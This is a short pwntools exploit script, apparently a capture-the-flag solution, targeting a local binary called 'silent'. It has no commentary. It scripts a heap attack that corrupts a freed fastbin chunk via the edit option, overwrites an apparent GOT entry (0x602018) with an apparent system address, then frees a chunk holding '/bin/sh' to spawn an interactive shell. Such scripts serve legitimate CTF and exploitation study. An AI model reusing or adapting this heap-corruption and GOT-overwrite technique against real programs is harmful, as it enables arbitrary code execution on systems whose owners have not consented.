#!/usr/bin/env python
from pwn import *

context.log_level="debug"

p=process("./silent")

def create(size,ctx):
	p.sendline("1")
	sleep(0.2)
	p.sendline(str(size))
	sleep(0.2)
	p.send(ctx)
	
def delete(index):
	p.sendline("2")
	sleep(0.2)
	p.sendline(str(index))
	
def edit(index,ctx,bss_ctx):
	p.sendline("3")
	sleep(0.2)
	p.sendline(str(index))
	sleep(0.2)
	p.send(ctx)
	sleep(0.2)
	p.send(bss_ctx)
	
gdb.attach(p)
create(0x60,"aa\n")
create(0x60,"bb\n")
create(0x60,"/bin/sh\x00\n")
delete(1)
delete(0)

edit(0,"\x9d\x20\x60\x00",p64(0)+p64(0x71)+"\n")

create(0x60,"bb\n")
create(0x60,"\x00"*0x13+p64(0x602018)+"\n")
edit(0,p64(0x400730),"aefasdfsd\n")
delete(2)
p.interactive()
